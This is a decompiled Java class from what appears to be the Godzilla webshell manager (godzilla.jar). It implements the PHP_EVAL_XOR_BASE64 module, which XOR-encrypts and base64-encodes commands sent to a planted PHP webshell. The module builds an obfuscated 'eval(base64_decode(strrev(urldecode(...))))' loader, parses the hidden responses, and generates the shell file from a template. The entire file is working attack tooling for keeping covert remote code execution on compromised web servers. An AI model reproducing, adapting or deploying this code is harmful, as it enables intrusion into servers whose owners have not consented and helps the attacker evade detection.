/*     */ package shells.cryptions.phpXor;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @CryptionAnnotation(Name = "PHP_EVAL_XOR_BASE64", payloadName = "PhpDynamicPayload")
/*     */ public class PhpEvalXor
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private byte[] key;
/*     */   private boolean state;
/*     */   private String pass;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String findStrRight;
/*     */   private String evalContent;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  30 */     this.shell = context;
/*  31 */     this.http = this.shell.getHttp();
/*  32 */     this.key = this.shell.getSecretKeyX().getBytes();
/*  33 */     this.pass = this.shell.getPassword();
/*  34 */     String findStrMd5 = functions.md5(this.shell.getSecretKey() + new String(this.key));
/*  35 */     this.findStrLeft = findStrMd5.substring(0, 16);
/*  36 */     this.findStrRight = findStrMd5.substring(16);
/*  37 */     this.evalContent = generateEvalContent();
/*     */     try {
/*  39 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  40 */       if (this.payload != null) {
/*  41 */         this.http.sendHttpResponse(this.payload);
/*  42 */         this.state = true;
/*     */       } else {
/*  44 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  47 */     } catch (Exception e) {
/*  48 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  57 */       return E(data);
/*  58 */     } catch (Exception e) {
/*  59 */       Log.error(e);
/*  60 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*  67 */     if (data != null && data.length > 0) {
/*     */       try {
/*  69 */         return D(findStr(data));
/*  70 */       } catch (Exception e) {
/*  71 */         Log.error(e);
/*  72 */         return null;
/*     */       } 
/*     */     }
/*  75 */     return data;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  83 */     return true;
/*     */   }
/*     */   
/*     */   public byte[] E(byte[] cs) {
/*  87 */     int len = cs.length;
/*  88 */     for (int i = 0; i < len; i++) {
/*  89 */       cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
/*     */     }
/*  91 */     return (String.format("%s=%s&", new Object[] { this.pass, this.evalContent }) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
/*     */   }
/*     */   public byte[] D(String data) {
/*  94 */     byte[] cs = functions.base64Decode(data);
/*  95 */     int len = cs.length;
/*  96 */     for (int i = 0; i < len; i++) {
/*  97 */       cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
/*     */     }
/*  99 */     return cs;
/*     */   }
/*     */   public String findStr(byte[] respResult) {
/* 102 */     String htmlString = new String(respResult);
/* 103 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean check() {
/* 108 */     return this.state;
/*     */   }
/*     */   
/*     */   public String generateEvalContent() {
/* 112 */     String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace("<?php", "");
/* 113 */     eval = functions.base64EncodeToString(eval.getBytes());
/* 114 */     eval = (new StringBuffer(eval)).reverse().toString();
/* 115 */     eval = String.format("eval(base64_decode(strrev(urldecode('%s'))));", new Object[] { URLEncoder.encode(eval) });
/* 116 */     eval = URLEncoder.encode(eval);
/* 117 */     return eval;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 123 */     return (new String(functions.readInputStreamAutoClose(PhpEvalXor.class.getResourceAsStream("template/eval.bin")))).replace("{pass}", password).getBytes();
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\phpXor\PhpEvalXor.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */